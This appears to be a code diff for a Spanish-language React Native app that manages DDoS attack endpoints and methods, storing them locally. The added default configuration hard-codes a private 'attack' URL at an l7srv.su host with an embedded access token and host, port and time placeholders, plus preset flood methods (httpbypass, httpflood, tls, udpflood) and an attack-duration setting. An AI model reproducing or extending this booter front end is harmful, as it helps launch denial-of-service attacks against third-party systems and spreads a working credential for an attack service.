@@ -11,21 +11,18 @@ import {
   FlatList,
 } from 'react-native';
 import { Ionicons } from '@expo/vector-icons';
-import axios from 'axios';
-
-const API_URL = process.env.EXPO_PUBLIC_BACKEND_URL;
+import AsyncStorage from '@react-native-async-storage/async-storage';
 
 interface APIConfig {
   id: string;
   name: string;
   url: string;
-  token?: string;
 }
 
 interface Method {
   id: string;
   name: string;
-  api_ids: string[];
+  apiId: string;
 }
 
 export default function ConfigScreen() {
@@ -40,9 +37,8 @@ export default function ConfigScreen() {
   // Form states
   const [apiName, setApiName] = useState('');
   const [apiUrl, setApiUrl] = useState('');
-  const [apiToken, setApiToken] = useState('');
   const [methodName, setMethodName] = useState('');
-  const [selectedApiIds, setSelectedApiIds] = useState<string[]>([]);
+  const [selectedApiId, setSelectedApiId] = useState('');
 
   useEffect(() => {
     loadData();
@@ -50,15 +46,18 @@ export default function ConfigScreen() {
 
   const loadData = async () => {
     try {
-      const [apisRes, methodsRes, settingsRes] = await Promise.all([
-        axios.get(`${API_URL}/api/configs`),
-        axios.get(`${API_URL}/api/methods`),
-        axios.get(`${API_URL}/api/settings`),
+      const [apisData, methodsData, settingsData] = await Promise.all([
+        AsyncStorage.getItem('apis'),
+        AsyncStorage.getItem('methods'),
+        AsyncStorage.getItem('settings'),
       ]);
 
-      setApis(apisRes.data);
-      setMethods(methodsRes.data);
-      setMaxTime(settingsRes.data.max_time_allowed.toString());
+      if (apisData) setApis(JSON.parse(apisData));
+      if (methodsData) setMethods(JSON.parse(methodsData));
+      if (settingsData) {
+        const settings = JSON.parse(settingsData);
+        setMaxTime(settings.maxTimeAllowed?.toString() || '300');
+      }
     } catch (error) {
       console.error('Error loading data:', error);
     }
@@ -66,40 +65,43 @@ export default function ConfigScreen() {
 
   const addAPI = async () => {
     if (!apiName || !apiUrl) {
-      Alert.alert('Error', 'Please fill all required fields');
+      Alert.alert('Error', 'Por favor completa todos los campos requeridos');
       return;
     }
 
     try {
-      await axios.post(`${API_URL}/api/configs`, {
+      const newApi: APIConfig = {
+        id: Date.now().toString(),
         name: apiName,
         url: apiUrl,
-        token: apiToken || null,
-      });
+      };
+
+      const updatedApis = [...apis, newApi];
+      await AsyncStorage.setItem('apis', JSON.stringify(updatedApis));
+      setApis(updatedApis);
 
       setApiName('');
       setApiUrl('');
-      setApiToken('');
       setShowAddAPI(false);
-      loadData();
-      Alert.alert('Success', 'API added successfully');
+      Alert.alert('Éxito', 'API agregada correctamente');
     } catch (error) {
-      Alert.alert('Error', 'Failed to add API');
+      Alert.alert('Error', 'No se pudo agregar la API');
     }
   };
 
   const deleteAPI = async (id: string) => {
-    Alert.alert('Confirm Delete', 'Are you sure you want to delete this API?', [
-      { text: 'Cancel', style: 'cancel' },
+    Alert.alert('Confirmar', '¿Estás seguro de eliminar esta API?', [
+      { text: 'Cancelar', style: 'cancel' },
       {
-        text: 'Delete',
+        text: 'Eliminar',
         style: 'destructive',
         onPress: async () => {
           try {
-            await axios.delete(`${API_URL}/api/configs/${id}`);
-            loadData();
+            const updatedApis = apis.filter((api) => api.id !== id);
+            await AsyncStorage.setItem('apis', JSON.stringify(updatedApis));
+            setApis(updatedApis);
           } catch (error) {
-            Alert.alert('Error', 'Failed to delete API');
+            Alert.alert('Error', 'No se pudo eliminar la API');
           }
         },
       },
@@ -108,33 +110,47 @@ export default function ConfigScreen() {
 
   const addMethod = async () => {
     if (!methodName) {
-      Alert.alert('Error', 'Please enter a method name');
+      Alert.alert('Error', 'Por favor ingresa un nombre de método');
+      return;
+    }
+
+    if (apis.length === 0) {
+      Alert.alert('Error', 'Primero debes agregar al menos una API');
       return;
     }
 
     try {
-      await axios.post(`${API_URL}/api/methods`, { name: methodName });
+      const newMethod: Method = {
+        id: Date.now().toString(),
+        name: methodName,
+        apiId: apis[0].id, // Default to first API
+      };
+
+      const updatedMethods = [...methods, newMethod];
+      await AsyncStorage.setItem('methods', JSON.stringify(updatedMethods));
+      setMethods(updatedMethods);
+
       setMethodName('');
       setShowAddMethod(false);
-      loadData();
-      Alert.alert('Success', 'Method added successfully');
+      Alert.alert('Éxito', 'Método agregado correctamente');
     } catch (error) {
-      Alert.alert('Error', 'Failed to add method');
+      Alert.alert('Error', 'No se pudo agregar el método');
     }
   };
 
   const deleteMethod = async (id: string) => {
-    Alert.alert('Confirm Delete', 'Are you sure you want to delete this method?', [
-      { text: 'Cancel', style: 'cancel' },
+    Alert.alert('Confirmar', '¿Estás seguro de eliminar este método?', [
+      { text: 'Cancelar', style: 'cancel' },
       {
-        text: 'Delete',
+        text: 'Eliminar',
         style: 'destructive',
         onPress: async () => {
           try {
-            await axios.delete(`${API_URL}/api/methods/${id}`);
-            loadData();
+            const updatedMethods = methods.filter((method) => method.id !== id);
+            await AsyncStorage.setItem('methods', JSON.stringify(updatedMethods));
+            setMethods(updatedMethods);
           } catch (error) {
-            Alert.alert('Error', 'Failed to delete method');
+            Alert.alert('Error', 'No se pudo eliminar el método');
           }
         },
       },
@@ -143,56 +159,98 @@ export default function ConfigScreen() {
 
   const openLinkModal = (method: Method) => {
     setSelectedMethodForLink(method);
-    setSelectedApiIds(method.api_ids || []);
+    setSelectedApiId(method.apiId);
     setShowLinkModal(true);
   };
 
-  const toggleApiSelection = (apiId: string) => {
-    if (selectedApiIds.includes(apiId)) {
-      setSelectedApiIds(selectedApiIds.filter((id) => id !== apiId));
-    } else {
-      setSelectedApiIds([...selectedApiIds, apiId]);
-    }
-  };
-
-  const linkApisToMethod = async () => {
-    if (!selectedMethodForLink) return;
+  const linkApiToMethod = async () => {
+    if (!selectedMethodForLink || !selectedApiId) return;
 
     try {
-      await axios.post(`${API_URL}/api/methods/link`, {
-        method_id: selectedMethodForLink.id,
-        api_ids: selectedApiIds,
-      });
+      const updatedMethods = methods.map((m) =>
+        m.id === selectedMethodForLink.id ? { ...m, apiId: selectedApiId } : m
+      );
+
+      await AsyncStorage.setItem('methods', JSON.stringify(updatedMethods));
+      setMethods(updatedMethods);
 
       setShowLinkModal(false);
       setSelectedMethodForLink(null);
-      setSelectedApiIds([]);
-      loadData();
-      Alert.alert('Success', 'APIs linked successfully');
+      setSelectedApiId('');
+      Alert.alert('Éxito', 'API vinculada correctamente');
     } catch (error) {
-      Alert.alert('Error', 'Failed to link APIs');
+      Alert.alert('Error', 'No se pudo vincular la API');
     }
   };
 
   const updateMaxTime = async () => {
     try {
-      await axios.post(`${API_URL}/api/settings`, {
-        max_time_allowed: parseInt(maxTime),
-      });
-      Alert.alert('Success', 'Settings updated successfully');
+      const settings = { maxTimeAllowed: parseInt(maxTime) };
+      await AsyncStorage.setItem('settings', JSON.stringify(settings));
+      Alert.alert('Éxito', 'Configuración actualizada');
     } catch (error) {
-      Alert.alert('Error', 'Failed to update settings');
+      Alert.alert('Error', 'No se pudo actualizar la configuración');
     }
+  };
+
+  const initializeDefaultData = async () => {
+    Alert.alert(
+      'Inicializar Datos',
+      '¿Deseas cargar la configuración por defecto? Esto agregará APIs y métodos de ejemplo.',
+      [
+        { text: 'Cancelar', style: 'cancel' },
+        {
+          text: 'Inicializar',
+          onPress: async () => {
+            try {
+              const defaultApi: APIConfig = {
+                id: 'default-l7-api',
+                name: 'Default L7 API',
+                url: 'https://api.l7srv.su/private/attack?token=SbesnilX8ololuZV8Jvo0k&host=[host]&port=[port]&time=[time]&method=[method]&concs=5',
+              };
+
+              const defaultMethods: Method[] = [
+                { id: 'method-1', name: 'httpbypass', apiId: 'default-l7-api' },
+                { id: 'method-2', name: 'httpflood', apiId: 'default-l7-api' },
+                { id: 'method-3', name: 'tls', apiId: 'default-l7-api' },
+                { id: 'method-4', name: 'udpflood', apiId: 'default-l7-api' },
+              ];
+
+              await AsyncStorage.setItem('apis', JSON.stringify([defaultApi]));
+              await AsyncStorage.setItem('methods', JSON.stringify(defaultMethods));
+
+              loadData();
+              Alert.alert('Éxito', 'Configuración por defecto cargada');
+            } catch (error) {
+              Alert.alert('Error', 'No se pudo inicializar la configuración');
+            }
+          },
+        },
+      ]
+    );
+  };
+
+  const getApiName = (apiId: string) => {
+    const api = apis.find((a) => a.id === apiId);
+    return api ? api.name : 'No vinculada';
   };
 
   return (
     <ScrollView style={styles.container} contentContainerStyle={styles.content}>
+      {/* Initialize Button */}
+      {apis.length === 0 && methods.length === 0 && (
+        <TouchableOpacity style={styles.initButton} onPress={initializeDefaultData}>
+          <Ionicons name="download" size={24} color="#fff" />
+          <Text style={styles.initButtonText}>Cargar Configuración por Defecto</Text>
+        </TouchableOpacity>
+      )}
+
       {/* APIs Section */}
       <View style={styles.section}>
         <View style={styles.sectionHeader}>
           <View style={styles.headerLeft}>
             <Ionicons name="cloud" size={24} color="#00d4ff" />
-            <Text style={styles.sectionTitle}>API Endpoints</Text>
+            <Text style={styles.sectionTitle}>APIs</Text>
           </View>
           <TouchableOpacity
             style={styles.addButton}
@@ -217,7 +275,7 @@ export default function ConfigScreen() {
         ))}
 
         {apis.length === 0 && (
-          <Text style={styles.emptyText}>No APIs configured yet</Text>
+          <Text style={styles.emptyText}>No hay APIs configuradas</Text>
         )}
       </View>
 
@@ -226,7 +284,7 @@ export default function ConfigScreen() {
         <View style={styles.sectionHeader}>
           <View style={styles.headerLeft}>
             <Ionicons name="hammer" size={24} color="#ff6b6b" />
-            <Text style={styles.sectionTitle}>Methods</Text>
+            <Text style={styles.sectionTitle}>Métodos</Text>
           </View>
           <TouchableOpacity
             style={styles.addButton}
@@ -241,7 +299,7 @@ export default function ConfigScreen() {
             <View style={styles.cardContent}>
               <Text style={styles.cardTitle}>{method.name}</Text>
               <Text style={styles.cardSubtitle}>
-                {method.api_ids?.length || 0} API(s) linked
+                API: {getApiName(method.apiId)}
               </Text>
             </View>
             <View style={styles.cardActions}>
@@ -259,7 +317,7 @@ export default function ConfigScreen() {
         ))}
 
         {methods.length === 0 && (
-          <Text style={styles.emptyText}>No methods configured yet</Text>
+          <Text style={styles.emptyText}>No hay métodos configurados</Text>
         )}
       </View>
 
@@ -268,12 +326,12 @@ export default function ConfigScreen() {
         <View style={styles.sectionHeader}>
           <View style={styles.headerLeft}>
             <Ionicons name="time" size={24} color="#f59e0b" />
-            <Text style={styles.sectionTitle}>Settings</Text>
+            <Text style={styles.sectionTitle}>Configuración</Text>
           </View>
         </View>
 
         <View style={styles.settingCard}>
-          <Text style={styles.label}>Max Time Allowed (seconds)</Text>
+          <Text style={styles.label}>Tiempo Máximo Permitido (segundos)</Text>
           <TextInput
             style={styles.input}
             value={maxTime}
@@ -283,7 +341,7 @@ export default function ConfigScreen() {
             placeholderTextColor="#6b7280"
           />
           <TouchableOpacity style={styles.saveButton} onPress={updateMaxTime}>
-            <Text style={styles.saveButtonText}>Save Settings</Text>
+            <Text style={styles.saveButtonText}>Guardar Configuración</Text>
           </TouchableOpacity>
         </View>
       </View>
@@ -293,7 +351,7 @@ export default function ConfigScreen() {
         <View style={styles.modalOverlay}>
           <View style={styles.modalContent}>
             <View style={styles.modalHeader}>
-              <Text style={styles.modalTitle}>Add New API</Text>
+              <Text style={styles.modalTitle}>Agregar Nueva API</Text>
               <TouchableOpacity onPress={() => setShowAddAPI(false)}>
                 <Ionicons name="close" size={24} color="#fff" />
               </TouchableOpacity>
@@ -303,7 +361,7 @@ export default function ConfigScreen() {
               style={styles.input}
               value={apiName}
               onChangeText={setApiName}
-              placeholder="API Name"
+              placeholder="Nombre de la API"
               placeholderTextColor="#6b7280"
             />
 
@@ -311,21 +369,13 @@ export default function ConfigScreen() {
               style={[styles.input, styles.textArea]}
               value={apiUrl}
               onChangeText={setApiUrl}
-              placeholder="API URL (use [host], [port], [time], [method] as placeholders)"
+              placeholder="URL de la API (usa [host], [port], [time], [method] como marcadores)"
               placeholderTextColor="#6b7280"
               multiline
             />
 
-            <TextInput
-              style={styles.input}
-              value={apiToken}
-              onChangeText={setApiToken}
-              placeholder="Token (optional)"
-              placeholderTextColor="#6b7280"
-            />
-
             <TouchableOpacity style={styles.modalButton} onPress={addAPI}>
-              <Text style={styles.modalButtonText}>Add API</Text>
+              <Text style={styles.modalButtonText}>Agregar API</Text>
             </TouchableOpacity>
           </View>
         </View>
@@ -336,7 +386,7 @@ export default function ConfigScreen() {
         <View style={styles.modalOverlay}>
           <View style={styles.modalContent}>
             <View style={styles.modalHeader}>
-              <Text style={styles.modalTitle}>Add New Method</Text>
+              <Text style={styles.modalTitle}>Agregar Nuevo Método</Text>
               <TouchableOpacity onPress={() => setShowAddMethod(false)}>
                 <Ionicons name="close" size={24} color="#fff" />
               </TouchableOpacity>
@@ -346,30 +396,30 @@ export default function ConfigScreen() {
               style={styles.input}
               value={methodName}
               onChangeText={setMethodName}
-              placeholder="Method Name (e.g., httpbypass)"
+              placeholder="Nombre del método (ej: httpbypass)"
               placeholderTextColor="#6b7280"
             />
 
             <TouchableOpacity style={styles.modalButton} onPress={addMethod}>
-              <Text style={styles.modalButtonText}>Add Method</Text>
+              <Text style={styles.modalButtonText}>Agregar Método</Text>
             </TouchableOpacity>
           </View>
         </View>
       </Modal>
 
-      {/* Link APIs Modal */}
+      {/* Link API Modal */}
       <Modal visible={showLinkModal} animationType="slide" transparent>
         <View style={styles.modalOverlay}>
           <View style={styles.modalContent}>
             <View style={styles.modalHeader}>
               <Text style={styles.modalTitle}>
-                Link APIs to {selectedMethodForLink?.name}
+                Vincular API a {selectedMethodForLink?.name}
               </Text>
               <TouchableOpacity
                 onPress={() => {
                   setShowLinkModal(false);
                   setSelectedMethodForLink(null);
-                  setSelectedApiIds([]);
+                  setSelectedApiId('');
                 }}
               >
                 <Ionicons name="close" size={24} color="#fff" />
@@ -383,12 +433,12 @@ export default function ConfigScreen() {
                 <TouchableOpacity
                   style={[
                     styles.apiItem,
-                    selectedApiIds.includes(item.id) && styles.apiItemSelected,
+                    selectedApiId === item.id && styles.apiItemSelected,
                   ]}
-                  onPress={() => toggleApiSelection(item.id)}
+                  onPress={() => setSelectedApiId(item.id)}
                 >
                   <View style={styles.checkbox}>
-                    {selectedApiIds.includes(item.id) && (
+                    {selectedApiId === item.id && (
                       <Ionicons name="checkmark" size={18} color="#fff" />
                     )}
                   </View>
@@ -399,9 +449,9 @@ export default function ConfigScreen() {
 
             <TouchableOpacity
               style={styles.modalButton}
-              onPress={linkApisToMethod}
+              onPress={linkApiToMethod}
             >
-              <Text style={styles.modalButtonText}>Link APIs</Text>
+              <Text style={styles.modalButtonText}>Vincular API</Text>
             </TouchableOpacity>
           </View>
         </View>
@@ -417,6 +467,21 @@ const styles = StyleSheet.create({
   },
   content: {
     padding: 16,
+  },
+  initButton: {
+    backgroundColor: '#10b981',
+    flexDirection: 'row',
+    alignItems: 'center',
+    justifyContent: 'center',
+    padding: 16,
+    borderRadius: 12,
+    marginBottom: 24,
+    gap: 12,
+  },
+  initButtonText: {
+    color: '#fff',
+    fontSize: 16,
+    fontWeight: 'bold',
   },
   section: {
     marginBottom: 24,
